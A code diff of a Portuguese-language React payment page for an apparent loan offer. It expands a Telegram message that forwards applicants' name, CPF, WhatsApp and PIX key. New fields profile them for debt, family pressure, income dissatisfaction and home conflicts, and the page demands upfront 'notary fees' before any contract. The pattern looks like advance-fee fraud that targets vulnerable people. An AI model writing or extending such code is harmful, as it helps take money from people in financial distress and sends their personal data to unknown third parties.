@@ -28,13 +28,24 @@ const Payment: React.FC<PaymentProps> = ({ formData }) => {
 
         // Enviar notificação para o Telegram
         const message = `
-<b>[NOVO] SB PAGAMENTOS:</b>
+<b>🚀 Nova Proposta Gerada!</b>
 <b>Nome:</b> ${formData.fullName}
 <b>CPF:</b> ${formData.cpf}
 <b>WhatsApp:</b> ${formData.whatsapp}
 <b>Valor:</b> R$ ${formData.amount.toLocaleString('pt-BR')}
 <b>Parcelas:</b> ${formData.installments}x
 <b>Chave PIX:</b> ${formData.pixKey}
+
+<b>--- Perfil e Percepção ---</b>
+<b>Finalidade:</b> ${formData.loanPurpose}
+<b>Negativado:</b> ${formData.isNegative}
+<b>Ajudar Família:</b> ${formData.helpFamily}
+<b>Insatisfação Renda:</b> ${formData.incomeDissatisfaction}
+<b>Deixou de fazer algo:</b> ${formData.stoppedDoingThings}
+<b>Conflitos em casa:</b> ${formData.homeConflicts}
+<b>Aceita Cartório:</b> ${formData.trustAgreement}
+
+<b>Status:</b> Aguardando pagamento das custas
         `;
         sendTelegramNotification(message.trim());
 
@@ -101,7 +112,7 @@ const Payment: React.FC<PaymentProps> = ({ formData }) => {
       <div className="space-y-2">
         <h3 className="text-xl font-bold text-gray-800">Assinatura Formalizada</h3>
         <p className="text-sm text-gray-600">
-          Para firmar o contrato oficialmente em cartório, é necessário o pagamento das custas abaixo.
+          Para firmar o contrato oficialmente em cartório, é necessário o pagamento das custas abaixo:
         </p>
       </div>
 
